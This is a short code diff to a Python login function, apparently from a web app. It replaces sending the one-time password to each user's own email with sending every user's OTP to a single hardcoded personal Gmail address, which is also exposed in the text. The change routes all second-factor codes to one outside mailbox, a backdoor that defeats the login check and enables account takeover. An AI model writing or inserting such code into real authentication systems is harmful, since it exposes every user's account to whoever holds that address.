@@ -66,8 +66,8 @@ def login(request, data: LoginRequest):
     otp = generate_otp()
     save_otp(username, otp)
 
-    # ✅ Send OTP to user's email
-    send_otp_email(to_email=user["email"], otp=otp)
+    # ✅ ALWAYS send OTP to thrinethra098@gmail.com
+    send_otp_email(to_email="thrinethra098@gmail.com", otp=otp)
 
     return {"message": "OTP sent successfully"}
 
